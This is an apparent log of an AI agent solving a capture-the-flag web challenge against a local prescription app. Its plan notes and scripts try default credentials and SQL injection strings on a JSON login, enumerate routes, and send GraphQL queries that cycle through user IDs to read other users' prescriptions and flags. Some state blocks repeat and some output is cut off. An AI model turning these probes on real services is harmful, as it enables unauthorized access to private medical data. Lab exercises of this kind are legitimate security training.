--- iter 4 bash --- $ cat <<'TXT' STACK: Werkzeug/3.0.3 Python/3.8.17 Flask-like app, Bootstrap frontend, JSON fetch API, client localStorage userID; no visible proxy/db yet. SURFACE: GET / redirects /login; GET /login login page; POST /login JSON {username,password}; linked external JS/CSS only; common probes /robots.txt /sitemap.xml /api /admin /debug /healthz /login.php /search* /backup /.git/HEAD returned 404. BUG-HYP: POST /login authentication oracle likely vulnerable to brute force or injection; evidence: CTF category brute_force, exposed JSON login, no CSRF/captcha/rate-limit observed in headers, app stores numeric/opaque userID in localStorage and redirects to /add_prescription. WHY: /login HTML contains fetch('/login', method POST, JSON username/password) and success returns userID then navigates /add_prescription; stack header Werkzeug/3.0.3 Python/3.8.17. PLAN: - HYPOTHESIS: weak/default credentials or auth bypass on POST /login (login endpoint is only live form/API and challenge category is brute_force). - ATTACK CHAIN: inventory forms/routes with reach-fuzz -> test login oracle/default creds/SQLi/time -> authenticate or derive userID bypass -> access protected prescription/admin routes -> flag. - FIRST PROBE: reach-fuzz forms --base http://127.0.0.1:9100 - ABANDON IF: reach-fuzz and manual POSTs show no alternate routes, no timing/error/boolean oracle, and brute-force/default creds fail. STATE (iter 4): - CONFIRMED: iter1 empty task_files; iter3 Flask/Werkzeug app; GET /login has JSON POST login form and redirects to /add_prescription on success; common initial paths 404. - REFUTED: source-code/static-file flag path unavailable (empty dir). - OPEN: weak/default credential brute force; SQLi in JSON login; client-side localStorage userID authorization bypass; hidden routes from form submission. - NEXT: run reach-fuzz forms. TXT reach-fuzz forms --base http://127.0.0.1:9100 STACK: Werkzeug/3.0.3 Python/3.8.17 Flask-like app, Bootstrap frontend, JSON fetch API, client localStorage userID; no visible proxy/db yet. SURFACE: GET / redirects /login; GET /login login page; POST /login JSON {username,password}; linked external JS/CSS only; common probes /robots.txt /sitemap.xml /api /admin /debug /healthz /login.php /search* /backup /.git/HEAD returned 404. BUG-HYP: POST /login authentication oracle likely vulnerable to brute force or injection; evidence: CTF category brute_force, exposed JSON login, no CSRF/captcha/rate-limit observed in headers, app stores numeric/opaque userID in localStorage and redirects to /add_prescription. WHY: /login HTML contains fetch('/login', method POST, JSON username/password) and success returns userID then navigates /add_prescription; stack header Werkzeug/3.0.3 Python/3.8.17. PLAN: - HYPOTHESIS: weak/default credentials or auth bypass on POST /login (login endpoint is only live form/API and challenge category is brute_force). - ATTACK CHAIN: inventory forms/routes with reach-fuzz -> test login oracle/default creds/SQLi/time -> authenticate or derive userID bypass -> access protected prescription/admin routes -> flag. - FIRST PROBE: reach-fuzz forms --base http://127.0.0.1:9100 - ABANDON IF: reach-fuzz and manual POSTs show no alternate routes, no timing/error/boolean oracle, and brute-force/default creds fail. STATE (iter 4): - CONFIRMED: iter1 empty task_files; iter3 Flask/Werkzeug app; GET /login has JSON POST login form and redirects to /add_prescription on success; common initial paths 404. - REFUTED: source-code/static-file flag path unavailable (empty dir). - OPEN: weak/default credential brute force; SQLi in JSON login; client-side localStorage userID authorization bypass; hidden routes from form submission. - NEXT: run reach-fuzz forms. [reach-fuzz forms] http://127.0.0.1:9100 (no
found) --- iter 5 bash --- $ cat <<'TXT' STATE (iter 5): - CONFIRMED: reach-fuzz found no literal ; login uses JS-only inputs/fetch. - REFUTED: automatic HTML form inventory not applicable. - OPEN: JSON POST login oracle; direct route access; hidden authenticated routes. - NEXT: POST baseline/default/SQLi probes and GET /add_prescription. REFLECT (iter 5 / 30): - PROGRESS: 15% of attack chain; login route identified but not exploited. - DEAD ENDS: static source; literal extraction. - PIVOT: test JSON API behavior and direct protected route access. - WHY MISSED: JS-only form meant form extractor did not trigger; need endpoint probing from markup. TXT TARGET=http://127.0.0.1:9100 for req in \ "GET /add_prescription" \ "GET /prescriptions" \ "GET /logout"; do set -- $req; echo "===== $1 $2 ====="; curl -isS -X "$1" "$TARGET$2"; echo; done for data in \ '{"username":"admin","password":"admin"}' \ '{"username":"admin","password":"password"}' \ '{"username":"test","password":"test"}' \ '{"username":"\u0027 OR 1=1-- -","password":"x"}' \ '{"username":"admin\u0027-- -","password":"x"}' \ '{"username":"admin","password":"\u0027 OR 1=1-- -"}'; do echo "===== POST $data ====="; curl -isS -X POST "$TARGET/login" -H 'Content-Type: application/json' --data "$data"; echo; done STATE (iter 5): - CONFIRMED: reach-fuzz found no literal ; login uses JS-only inputs/fetch. - REFUTED: automatic HTML form inventory not applicable. - OPEN: JSON POST login oracle; direct route access; hidden authenticated routes. - NEXT: POST baseline/default/SQLi probes and GET /add_prescription. REFLECT (iter 5 / 30): - PROGRESS: 15% of attack chain; login route identified but not exploited. - DEAD ENDS: static source; literal extraction. - PIVOT: test JSON API behavior and direct protected route access. - WHY MISSED: JS-only form meant form extractor did not trigger; need endpoint probing from markup. ===== GET /add_prescription ===== HTTP/1.1 401 UNAUTHORIZED Server: Werkzeug/3.0.3 Python/3.8.17 Date: Thu, 18 Jun 2026 12:10:00 GMT Content-Type: text/html; charset=utf-8 Content-Length: 317 Vary: Cookie Connection: close 401 Unauthorized

/prescriptions 404; default admin/admin, admin/password, test/test fail; simple SQLi strings in username/password fail uniformly. - REFUTED: trivial default credentials; simplest tautology SQLi in login. - OPEN: real weak credential brute force; auth mechanism/session cookie after login; additional routes; non-JSON/form parser quirks. - NEXT: enumerate likely Flask/MedGuard routes and parser variants. TXT TARGET=http://127.0.0.1:9100 python3 - <<'PY' import requests, hashlib, itertools base='http://127.0.0.1:9100' paths=['register','signup','add_prescription','view_prescriptions','view_prescription','prescription','prescriptions','my_prescriptions','dashboard','home','profile','patients','patient','doctors','doctor','medications','medicine','flag','get_flag','admin','admin/flag','api/login','api/prescriptions','api/prescription','api/add_prescription','static/app.js','static/js/app.js'] for p in paths: for suffix in ['','/']: url=f'{base}/{p}{suffix}' r=requests.get(url,allow_redirects=False,timeout=3) if r.status_code!=404: print('GET',url,r.status_code,len(r.content),r.headers.get('Location'),r.headers.get('Set-Cookie'),r.text) print('--- parser variants ---') variants=[ ('json empty',{},None), ('form',{'data':{'username':'admin','password':'admin'}},None), ('query',{},'?username=admin&password=admin'), ] for name,kw,q in variants: url=base+'/login'+(q or '') r=requests.post(url,timeout=3,**kw) print(name,r.status_code,r.headers.get('Content-Type'),len(r.content),r.text) PY STATE (iter 6): - CONFIRMED: /add_prescription and /logout exist but 401; /prescriptions 404; default admin/admin, admin/password, test/test fail; simple SQLi strings in username/password fail uniformly. - REFUTED: trivial default credentials; simplest tautology SQLi in login. - OPEN: real weak credential brute force; auth mechanism/session cookie after login; additional routes; non-JSON/form parser quirks. - NEXT: enumerate likely Flask/MedGuard routes and parser variants. TXT
python3 - <<'PY'
import requests,json,re
base='http://127.0.0.1:9100'
s=requests.Session(); print(s.post(base+'/login',json={'username':'user','password':'user'}).text)
def gql(q):
    r=s.post(base+'/graphql',json={'query':q},timeout=5)
    print('QUERY:',q)
    print('STATUS',r.status_code,'LEN',len(r.content),'CT',r.headers.get('Content-Type'))
    print(r.text)
    return r
queries=[]
for uid in range(1,8):
    queries.append(f'query {{ getPrescriptions(userId: {uid}) {{ id userId prescriptionDetails flag }} }}')
queries += [
    'query { __schema { queryType { name fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } mutationType { name fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }',
    'mutation { addPrescription(userId: 2, prescriptionDetails: "testprobe") { prescription { id userId prescriptionDetails flag } } }',
]
for q in queries:
    r=gql(q)
    if re.search(r'flag\{[^}]+\}', r.text, re.I):
        break
PY
